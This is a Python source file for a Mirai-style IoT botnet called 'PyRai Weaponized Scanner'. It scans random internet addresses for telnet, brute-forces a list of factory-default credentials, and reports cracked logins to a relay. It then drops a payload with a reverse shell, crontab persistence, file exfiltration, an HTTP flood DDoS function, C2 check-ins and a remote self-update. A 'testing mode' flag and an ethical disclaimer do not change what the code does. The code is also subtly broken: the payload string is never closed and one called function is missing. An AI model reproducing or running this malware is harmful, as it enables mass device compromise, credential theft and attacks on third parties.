#!/usr/bin/env python3
"""
PyRai Weaponized Scanner Module - Enhanced with Backdoor Capabilities
ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.
"""

import socket, time, sys, telnetlib, os, hashlib, platform, logging, subprocess, base64, json
from random import randrange
from threading import Thread, Lock
from datetime import datetime, timedelta
import struct

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('scanner.log'),
        logging.StreamHandler()
    ]
)

# TESTING SAFEGUARDS
TESTING_MODE = True  # Set to False only in authorized lab environments
MAX_SCAN_TARGETS = 100 if TESTING_MODE else 1000000
SCAN_DELAY = 2 if TESTING_MODE else 0.1
MAX_INFECTIONS = 10 if TESTING_MODE else 10000

# Self-destruct mechanism (90 days)
CREATION_DATE = datetime.now()
EXPIRY_DATE = CREATION_DATE + timedelta(days=90)

# Backdoor Configuration
BACKDOOR_PORT = 31339
C2_SERVER = "127.0.0.1"  # Change for your lab
C2_PORT = 31340
REVERSE_SHELL_PORT = 31341

# Default credentials for IoT devices (common factory defaults)
MAlist = [('root','xc3511'),
          ('root','vizxv'),
          ('root','admin'),
          ('admin','admin'),
          ('root','888888'),
          ('root','xmhdipc'),
          ('root','default'),
          ('root','juantech'),
          ('root','123456'),
          ('root','54321'),
          ('support','support'),
          ('root',''),
          ('admin','password'),
          ('root','root'),
          ('root','12345'),
          ('user','user'),
          ('admin',''),
          ('root','pass'),
          ('admin','admin1234'),
          ('root','1111'),
          ('admin','smcadmin'),
          ('admin','1111'),
          ('root','666666'),
          ('root','password'),
          ('root','1234'),
          ('root','klv123'),
          ('Administrator','admin'),
          ('service','service'),
          ('supervisor','supervisor'),
          ('guest','guest'),
          ('guest','12345'),
          ('admin1','password'),
          ('administrator','1234'),
          ('666666','666666'),
          ('888888','888888'),
          ('ubnt','ubnt'),
          ('root','klv1234'),
          ('root','Zte521'),
          ('root','hi3518'),
          ('root','jvbzd'),
          ('root','anko'),
          ('root','zlxx.'),
          ('root','7ujMko0vizxv'),
          ('root','7ujMko0admin'),
          ('root','system'),
          ('root','ikwb'),
          ('root','dreambox'),
          ('root','user'),
          ('root','realtek'),
          ('root','00000000'),
          ('admin','1111111'),
          ('admin','1234'),
          ('admin','12345'),
          ('admin','54321'),
          ('admin','123456'),
          ('admin','7ujMko0admin'),
          ('admin','pass'),
          ('admin','meinsm'),
          ('tech','tech'),
          ('mother','fucker')] 

pindex = 0
pindex_lock = Lock()
scan_count = 0
scan_lock = Lock()
infected_bots = []
bots_lock = Lock()

# Relay Configuration - UPDATE THESE FOR YOUR TEST ENVIRONMENT
__RELAY_H__ = "127.0.0.1"  # Changed to localhost for testing
__RELAY_P__ = 31337
__RELAY_PS_ = "||"

# Scanner Configuration
__TIMEOUT__ = 3  # Increased timeout for stability
__C2DELAY__ = 5
__THREADS__ = 5  # Reduced for testing

class BackdoorPayload:
    """Enhanced backdoor payload with multiple capabilities"""
    
    @staticmethod
    def generate_reverse_shell():
        """Generate reverse shell payload"""
        payload = f'''#!/usr/bin/env python3
import socket, subprocess, os, sys, time, threading, json, struct
from datetime import datetime, timedelta

# Self-destruct after 90 days
EXPIRY = datetime.now() + timedelta(days=90)

def check_expiry():
    if datetime.now() > EXPIRY:
        try:
            os.remove(__file__)
        except:
            pass
        sys.exit(0)

def reverse_shell():
    check_expiry()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{C2_SERVER}", {REVERSE_SHELL_PORT}))
        
        while True:
            command = s.recv(1024).decode()
            if command.lower() == 'exit':
                break
            elif command.lower() == 'persist':
                # Install persistence
                persist_backdoor()
            elif command.startswith('download '):
                # File download
                filename = command.split(' ', 1)[1]
                download_file(s, filename)
            elif command.startswith('upload '):
                # File upload
                filename = command.split(' ', 1)[1]
                upload_file(s, filename)
            else:
                # Execute command
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except Exception as e:
                    s.send(str(e).encode())
        s.close()
    except:
        pass

def persist_backdoor():
    """Install persistence mechanism"""
    try:
        # Create startup script
        if os.name == 'posix':
            startup_script = '/tmp/.system_update'
            with open(startup_script, 'w') as f:
                f.write('#!/bin/bash\\n')
                f.write(f'python3 {{__file__}} &\\n')
            os.chmod(startup_script, 0o755)
            
            # Add to crontab
            os.system(f'(crontab -l 2>/dev/null; echo "@reboot {{startup_script}}") | crontab -')
    except:
        pass

def download_file(sock, filename):
    """Download file from bot"""
    try:
        with open(filename, 'rb') as f:
            data = f.read()
            sock.send(struct.pack('!I', len(data)))
            sock.send(data)
    except Exception as e:
        sock.send(struct.pack('!I', 0))

def upload_file(sock, filename):
    """Upload file to bot"""
    try:
        size_data = sock.recv(4)
        size = struct.unpack('!I', size_data)[0]
        data = sock.recv(size)
        with open(filename, 'wb') as f:
            f.write(data)
    except:
        pass

def ddos_attack(target_ip, target_port, duration):
    """Simple DDoS attack function"""
    check_expiry()
    end_time = time.time() + duration
    
    def attack_worker():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.send(b'GET / HTTP/1.1\\r\\nHost: ' + target_ip.encode() + b'\\r\\n\\r\\n')
                s.close()
            except:
                pass
            time.sleep(0.01)
    
    # Launch multiple attack threads
    for _ in range(10):
        t = threading.Thread(target=attack_worker)
        t.daemon = True
        t.start()

def c2_listener():
    """Listen for C2 commands"""
    while True:
        check_expiry()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("{C2_SERVER}", {C2_PORT}))
            
            # Send bot info
            bot_info = {{
                'ip': socket.gethostbyname(socket.gethostname()),
                'os': os.name,
                'platform': sys.platform,
                'timestamp': str(datetime.now())
            }}
            s.send(json.dumps(bot_info).encode())
            
            # Wait for commands
            while True:
                try:
                    command = s.recv(1024).decode()
                    if not command:
                        break
                    
                    cmd_parts = command.split(' ')
                    
                    if cmd_parts[0] == 'ddos':
                        target_ip = cmd_parts[1]
                        target_port = int(cmd_parts[2])
                        duration = int(cmd_parts[3])
                        ddos_attack(target_ip, target_port, duration)
                    elif cmd_parts[0] == 'shell':
                        reverse_shell()
                    elif cmd_parts[0] == 'update':
                        # Self-update mechanism
                        update_payload(cmd_parts[1])
                    
                except:
                    break
            s.close()
        except:
            pass
        time.sleep(30)  # Retry every 30 seconds

def update_payload(new_payload_url):
    """Update payload from URL"""
    try:
        import urllib.request
        urllib.request.urlretrieve(new_payload_url, __file__)
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except:
        pass

def check_self_destruct():
    """Check if payload should self-destruct"""
    if datetime.now() > EXPIRY_DATE:
        logging.info("[scanner] Self-destruct activated - 90 days expired")
        try:
            os.remove(__file__)
        except:
            pass
        sys.exit(0)

def get_credentials():
    """Thread-safe credential retrieval"""
    global MAlist, pindex, pindex_lock
    with pindex_lock:
        if pindex >= len(MAlist):
            return None, None
        user = MAlist[pindex][0]
        password = MAlist[pindex][1]
        logging.info(f"[scanner] Trying {user}:{password}")
        pindex += 1
        return user, password

def deploy_backdoor(tn, ip, port, user, password):
    """Deploy backdoor payload to compromised system"""
    global infected_bots, bots_lock
    
    try:
        logging.info(f"[scanner] Deploying backdoor to {ip}:{port}")
        
        # Generate payload
        if TESTING_MODE:
            payload = BackdoorPayload.generate_simple_backdoor()
            payload_name = "test_backdoor.py"
        else:
            payload = BackdoorPayload.generate_reverse_shell()
            payload_name = ".system_update.py"
        
        # Create temporary payload file
        temp_payload = f"/tmp/{payload_name}"
        
        # Upload payload via telnet session
        commands = [
            f"cd /tmp || cd /var/tmp || cd .",
            f"cat > {payload_name} << 'EOF'",
            payload,
            "EOF",
            f"chmod +x {payload_name}",
            f"python3 {payload_name} &" if not TESTING_MODE else f"echo 'Backdoor deployed: {payload_name}'",
            f"nohup python3 {payload_name} > /dev/null 2>&1 &" if not TESTING_MODE else "echo 'Testing mode - not executing'"
        ]
        
        for cmd in commands:
            tn.write((cmd + "\n").encode('ascii'))
            time.sleep(0.5)
        
        # Add to infected bots list
        with bots_lock:
            bot_info = {
                'ip': ip,
                'port': port,
                'user': user,
                'password': password,
                'infected_time': datetime.now(),
                'backdoor_port': BACKDOOR_PORT
            }
            infected_bots.append(bot_info)
            
        logging.info(f"[scanner] Backdoor deployed successfully to {ip}:{port}")
        return True
        
    except Exception as e:
        logging.error(f"[scanner] Failed to deploy backdoor to {ip}:{port}: {str(e)}")
        return False

def c2crd(usr, psw, ip, port):
    """Send credentials to relay with enhanced error handling"""
    global __RELAY_H__, __RELAY_P__, __RELAY_PS_
    max_retries = 3
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            logging.info("[scanner] Sending credentials to remote relay..")
            tcpClientA = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
            tcpClientA.settimeout(10)
            tcpClientA.connect((__RELAY_H__, __RELAY_P__))
            
            message = f"!{__RELAY_PS_}{usr}{__RELAY_PS_}{psw}{__RELAY_PS_}{ip}{__RELAY_PS_}{port}"
            tcpClientA.send(message.encode('ascii'))
            
            data = tcpClientA.recv(1024)
            data = str(data, 'utf-8', 'ignore')
            
            if data == "10":
                tcpClientA.close() 
                logging.info("[scanner] Remote relay returned code 10(ok).")
                return True
                
        except Exception as e:
            retry_count += 1
            logging.error(f"[scanner] Unable to contact remote relay (attempt {retry_count}): {str(e)}")
            if retry_count < max_retries:
                time.sleep(5)
            
        finally:
            try:
                tcpClientA.close()
            except:
                pass
    
    logging.error("[scanner] Failed to contact relay after all retries")
    return False

def bruteport(ip, port):
    """Enhanced brute force with backdoor deployment"""
    global pindex, pindex_lock, infected_bots, bots_lock
    
    # Check infection limit
    with bots_lock:
        if len(infected_bots) >= MAX_INFECTIONS:
            logging.warning(f"[scanner] Reached infection limit of {MAX_INFECTIONS}")
            return False
    
    logging.info(f"[scanner] Attempting to brute found IP {ip}")
    
    tn = None
    need_user = False
    max_attempts = 10
    attempt_count = 0
    
    try:
        while attempt_count < max_attempts:
            try:
                user = ""
                password = ""
                
                if not tn:
                    asked_password_in_cnx = False
                    tn = telnetlib.Telnet(ip, port, timeout=__TIMEOUT__)
                    logging.info(f"[scanner] Connection established to {ip}")
                
                while True:
                    response = tn.read_until(b":", 2)
                    response_str = str(response)
                    
                    if "Login:" in response_str or "Username:" in response_str:
                        logging.info("[scanner] Received username prompt")
                        need_user = True
                        asked_password_in_cnx = False 
                        user, password = get_credentials()
                        
                        if user is None:
                            logging.warning("[scanner] Out of credentials")
                            return False
                            
                        tn.write((user + "\n").encode('ascii'))
                        
                    elif "Password:" in response_str:
                        if asked_password_in_cnx and need_user:
                            tn.close()
                            break 
                            
                        asked_password_in_cnx = True 
                        
                        if not need_user:
                            user, password = get_credentials()
                            
                        if not password or user is None:
                            logging.warning("[scanner] Bruteforce failed, out of credentials")
                            return False
                            
                        logging.info("[scanner] Received password prompt")
                        tn.write((password + "\n").encode('ascii'))
                        
                    if any(prompt in response_str for prompt in [">", "$", "#", "%"]):
                        logging.info(f"[scanner] Bruteforce succeeded {ip} : {user}:{password}")
                        
                        # Send credentials to relay
                        c2crd(user, password, ip, port)
                        
                        # Deploy backdoor
                        deploy_backdoor(tn, ip, port, user, password)
                        
                        # Reset credential index for next target
                        with pindex_lock:
                            pindex = 0
                        return True
                        
                if any(prompt in response_str for prompt in [">", "$", "#", "%"]):
                    break
                    
                attempt_count += 1
                
            except EOFError as e:
                tn = None
                need_user = False
                logging.warning(f"[scanner] Remote host dropped connection: {str(e)}")
                time.sleep(2)
                attempt_count += 1
                
    except Exception as e:
        logging.error(f"[scanner] Brute force error on {ip}: {str(e)}")
        
    finally:
        if tn:
            try:
                tn.close()
            except:
                pass
                
    return False

def scan23(ip):
    """Enhanced port scanning with failover"""
    check_self_destruct()
    
    logging.info(f"[scanner] Scanning {ip}")
    
    # Check scan limit for testing
    global scan_count, scan_lock
    with scan_lock:
        if scan_count >= MAX_SCAN_TARGETS:
            logging.warning(f"[scanner] Reached testing limit of {MAX_SCAN_TARGETS} scans")
            return
        scan_count += 1
    
    # Primary port 23
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(__TIMEOUT__)
    
    try:
        result = sock.connect_ex((ip, 23))
        if result == 0:
            logging.info(f"[scanner] Found open telnet on {ip}:23")
            bruteport(ip, 23)
            return
    except Exception as e:
        logging.debug(f"[scanner] Error scanning {ip}:23 - {str(e)}")
    finally:
        sock.close()
    
    # Failover port 2323
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(__TIMEOUT__)
    
    try:
        result = sock.connect_ex((ip, 2323))
        if result == 0:
            logging.info(f"[scanner] Found open telnet on {ip}:2323")
            bruteport(ip, 2323)
            return
    except Exception as e:
        logging.debug(f"[scanner] Error scanning {ip}:2323 - {str(e)}")
    finally:
        sock.close()
    
    logging.debug(f"[scanner] No telnet services found on {ip}")

def generateIP():
    """Generate random IP with enhanced filtering for testing"""
    if TESTING_MODE:
        # In testing mode, generate IPs from safe ranges
        # Using RFC 3927 test ranges
        return f"192.0.2.{randrange(1, 254)}"  # TEST-NET-1
    
    # Original IP generation logic for lab environments
    blockOne = randrange(1, 255)
    blockTwo = randrange(0, 255)
    blockThree = randrange(0, 255)
    blockFour = randrange(1, 254)
    
    # Filter out reserved ranges
    reserved_ranges = [
        (127, None, None, None),  # Loopback
        (10, None, None, None),   # Private
        (172, 16, 31, None),      # Private
        (192, 168, None, None),   # Private
        (169, 254, None, None),   # Link-local
        (224, None, None, None),  # Multicast
    ]
    
    for reserved in reserved_ranges:
        if (blockOne == reserved[0] and 
            (reserved[1] is None or blockTwo == reserved[1]) and
            (reserved[2] is None or blockThree == reserved[2])):
            return generateIP()
    
    return f"{blockOne}.{blockTwo}.{blockThree}.{blockFour}"

def botnet_status():
    """Display current botnet status"""
    with bots_lock:
        logging.info(f"[scanner] Current botnet size: {len(infected_bots)}")
        for i, bot in enumerate(infected_bots[-5:]):  # Show last 5
            logging.info(f"[scanner] Bot {i+1}: {bot['ip']}:{bot['port']} ({bot['infected_time']})")

def scanner_worker():
    """Worker thread for scanning"""
    while True:
        try:
            check_self_destruct()
            ip = generateIP()
            scan23(ip)
            time.sleep(SCAN_DELAY)  # Rate limiting for testing
            
            # Periodic status update
            if scan_count % 10 == 0:
                botnet_status()
                
        except KeyboardInterrupt:
            logging.info("[scanner] Worker thread stopping...")
            break
        except Exception as e:
            logging.error(f"[scanner] Worker error: {str(e)}")
            time.sleep(1)

def main():
    """Main scanner function with safety checks"""
    logging.info("="*50)
    logging.info("PyRai Weaponized Scanner - Enhanced with Backdoor Capabilities")
    logging.info("ETHICAL DISCLAIMER: This tool is for authorized testing only.")
    logging.info("="*50)
    
    if TESTING_MODE:
        logging.warning("TESTING MODE ENABLED - Limited functionality")
        logging.info(f"Max targets: {MAX_SCAN_TARGETS}")
        logging.info(f"Max infections: {MAX_INFECTIONS}")
        logging.info(f"Scan delay: {SCAN_DELAY}s")
        logging.info(f"Self-destruct date: {EXPIRY_DATE}")
    
    # Safety confirmation
    print("\n[SAFETY CONFIRMATION]")
    print("This weaponized scanner will:")
    print("- Scan for vulnerable telnet services")
    print("- Deploy backdoor payloads on compromised systems")
    print("- Establish reverse shell connections")
    print("- Create a botnet for authorized testing")
    print("Ensure you have proper authorization for all target networks.")
    confirm = input("Type 'AUTHORIZED' to continue: ")
    
    if confirm != 'AUTHORIZED':
        logging.error("Safety confirmation failed. Exiting.")
        sys.exit(1)
    
    logging.info(f"Starting {__THREADS__} weaponized scanner threads...")
    logging.info(f"Backdoor port: {BACKDOOR_PORT}")
    logging.info(f"C2 server: {C2_SERVER}:{C2_PORT}")
    logging.info(f"Reverse shell port: {REVERSE_SHELL_PORT}")
    
    threads = []
    try:
        for i in range(__THREADS__):
            t = Thread(target=scanner_worker, daemon=True)
            t.start()
            threads.append(t)
            logging.info(f"Started weaponized scanner thread {i+1}")
        
        # Keep main thread alive and show periodic status
        while True:
            time.sleep(30)
            botnet_status()
            
    except KeyboardInterrupt:
        logging.info("Shutdown signal received...")
        with bots_lock:
            logging.info(f"Final botnet size: {len(infected_bots)}")
        sys.exit(0)

if __name__ == "__main__":
    main()
